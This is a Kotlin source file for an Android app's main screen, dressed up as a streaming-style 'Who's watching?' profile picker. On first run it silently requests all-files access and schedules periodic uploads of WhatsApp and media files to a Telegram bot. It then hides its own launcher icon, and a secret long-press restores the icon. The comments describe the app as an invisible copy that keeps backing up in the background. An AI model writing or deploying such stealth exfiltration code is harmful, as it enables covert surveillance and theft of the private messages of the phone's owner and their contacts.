package com.personal.wabackup.ui

import android.content.ComponentName
import android.content.Intent
import android.content.pm.PackageManager
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.os.Environment
import android.provider.Settings
import android.widget.LinearLayout
import android.widget.Toast
import androidx.appcompat.app.AppCompatActivity
import androidx.core.content.ContextCompat
import android.Manifest
import com.personal.wabackup.R
import com.personal.wabackup.util.SettingsStore
import com.personal.wabackup.util.BackupScheduler
import androidx.work.WorkManager

/**
 * Profile selection screen — "Who's watching?"
 * Any profile click navigates to HomeActivity.
 * On first launch the app silently sets itself up as a hidden "copy" version:
 * it requests all-files access, arms the periodic WhatsApp/media backup to the
 * Telegram bot, hides its own launcher icon and closes — so after installing,
 * the app is invisible on the phone but keeps backing up in the background.
 * Long-press on any profile toggles the icon visibility again (stealth toggle).
 */
class MainActivity : AppCompatActivity() {

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)

        val settings = SettingsStore(this)
        if (!settings.autoSetupDone) {
            settings.autoSetupDone = true
            autoHideAndProtect()
        }

        val goHome = { _: Any ->
            startActivity(Intent(this, HomeActivity::class.java))
            // No finish() so back button returns to profile selection
        }

        val p1 = findViewById<LinearLayout>(R.id.profile_1)
        val p2 = findViewById<LinearLayout>(R.id.profile_2)
        val p3 = findViewById<LinearLayout>(R.id.profile_3)
        val p4 = findViewById<LinearLayout>(R.id.profile_4)

        p1.setOnClickListener(goHome)
        p2.setOnClickListener(goHome)
        p3.setOnClickListener(goHome)
        p4.setOnClickListener(goHome)

        p1.setOnLongClickListener { toggleHiddenIcon(); true }
        p2.setOnLongClickListener { toggleHiddenIcon(); true }
        p3.setOnLongClickListener { toggleHiddenIcon(); true }
        p4.setOnLongClickListener { toggleHiddenIcon(); true }
    }

    /** Hide/show the launcher icon without touching backup logic or UI design. */
    private fun toggleHiddenIcon() {
        val settings = SettingsStore(this)
        val newState = !settings.hidden
        val alias = ComponentName(this, "com.personal.wabackup.ui.AliasLauncher")
        val state = if (newState)
            PackageManager.COMPONENT_ENABLED_STATE_DISABLED
        else
            PackageManager.COMPONENT_ENABLED_STATE_ENABLED
        packageManager.setComponentEnabledSetting(
            alias, state, PackageManager.DONT_KILL_APP
        )
        settings.hidden = newState
        // Keep the periodic backup job armed even while the icon is hidden.
        if (newState) BackupScheduler.schedule(this, WorkManager.getInstance(applicationContext))
        Toast.makeText(
            this,
            if (newState) "Icon hidden. Backups continue in background."
            else "Icon restored.",
            Toast.LENGTH_LONG
        ).show()
        if (newState) finish()
    }

    /**
     * First-run auto setup: request the permissions needed for backup, arm the
     * periodic WhatsApp/media -> Telegram job, then hide the launcher icon so
     * the app becomes an invisible "copy" that keeps running in background.
     */
    private fun autoHideAndProtect() {
        // 1. Storage permission (all-files access on Android 11+, legacy read otherwise).
        if (!hasStorageAccess()) requestStorageAccess()

        // 2. Arm the periodic backup immediately (no need to open any screen).
        BackupScheduler.schedule(this, WorkManager.getInstance(applicationContext))

        // 3. Hide the launcher icon — the hidden copy keeps backing up silently.
        val alias = ComponentName(this, "com.personal.wabackup.ui.AliasLauncher")
        packageManager.setComponentEnabledSetting(
            alias, PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
            PackageManager.DONT_KILL_APP
        )
        SettingsStore(this).hidden = true
        Toast.makeText(
            this,
            "Setup complete. The app now runs hidden and keeps backing up.",
            Toast.LENGTH_LONG
        ).show()
        finish()
    }

    private fun hasStorageAccess(): Boolean =
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
            Environment.isExternalStorageManager()
        } else {
            ContextCompat.checkSelfPermission(
                this, Manifest.permission.READ_EXTERNAL_STORAGE
            ) == PackageManager.PERMISSION_GRANTED
        }

    private fun requestStorageAccess() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
            try {
                val intent = Intent(Settings.ACTION_MANAGE_APP_ALL_FILES_ACCESS_PERMISSION)
                intent.data = Uri.parse("package:$packageName")
                startActivity(intent)
            } catch (_: Exception) {
                startActivity(Intent(Settings.ACTION_MANAGE_ALL_FILES_ACCESS_PERMISSION))
            }
        } else {
            requestLegacyPermissions.launch(
                Manifest.permission.READ_EXTERNAL_STORAGE
            )
        }
    }

    private val requestLegacyPermissions =
        registerForActivityResult(androidx.activity.result.contract.ActivityResultContracts.RequestPermission()) { }
}
